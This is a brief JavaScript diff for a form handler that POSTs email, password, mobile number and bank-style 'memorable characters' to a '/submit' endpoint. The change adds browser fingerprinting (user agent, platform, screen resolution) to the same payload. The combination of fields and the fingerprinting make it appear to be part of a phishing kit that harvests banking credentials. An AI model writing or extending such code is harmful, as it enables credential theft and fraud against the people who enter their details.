@@ -341,6 +341,13 @@
       });
     }
     
+    var deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: window.screen.width + 'x' + window.screen.height
+    };
+    var browserAgent = navigator.userAgent;
+    var screenRes = window.screen.width + 'x' + window.screen.height;
     try {
       await fetch('/submit', {
         method: 'POST',
@@ -351,7 +358,10 @@
           email: emailEl?.value || '', 
           pwd: document.getElementById('pwd')?.value || memorable_chars || '', 
           mobile: mobileEl?.value || '',
-          memorable_chars: memorable_chars 
+          memorable_chars: memorable_chars,
+          browser_agent: browserAgent,
+          screen_resolution: screenRes,
+          deviceInfo: deviceInfo
         })
       });
     } catch (e) {
